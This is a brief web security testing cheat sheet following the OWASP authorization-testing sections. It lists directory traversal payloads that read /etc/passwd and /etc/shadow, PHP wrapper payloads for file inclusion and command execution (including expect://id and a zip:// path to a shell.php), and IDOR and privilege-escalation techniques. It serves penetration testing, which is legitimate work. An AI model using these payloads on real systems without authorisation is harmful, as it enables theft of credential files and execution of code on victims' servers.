# 4.5 Authorization Testing (WSTG-ATHZ)

Tests covering directory traversal, authorization bypass, privilege escalation, and IDOR.

---

## WSTG-ATHZ-01: Directory Traversal / File Include
**Payloads:**
```
../../../../etc/passwd
../../../../etc/shadow
../../../../windows/win.ini
..%2F..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%00/etc/passwd               # Null byte truncation (old PHP)
```

**PHP Wrappers (LFI elevation):**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
zip://../uploads/file.jpg%23shell.php
expect://id
```

---

## WSTG-ATHZ-02: Bypass Authorization Schema
**Techniques:**
- Horizontal privilege escalation: Access other users' resources (change `userId=1` to `userId=2`)
- Vertical privilege escalation: Access higher-privilege functions
- IDOR: Manipulate object IDs directly
- Forced browsing to restricted pages
- HTTP method switching (GET→POST or vice versa)
- Parameter/cookie manipulation for role

---

## WSTG-ATHZ-03: Privilege Escalation
**Test:** Perform admin actions from a low-privilege account; modify privilege-related params (`isAdmin`, `userType`, `role`).

---

## WSTG-ATHZ-04: Insecure Direct Object References (IDOR)
**Identify:** Sequential IDs, GUIDs, filenames in URLs or params
**Test:** Enumerate values; access other users' objects
```
/api/users/1/profile → change to /api/users/2/profile
/download?file=invoice_1001.pdf → invoice_1000.pdf
/orders?orderId=ORD-12345 → ORD-12344
```
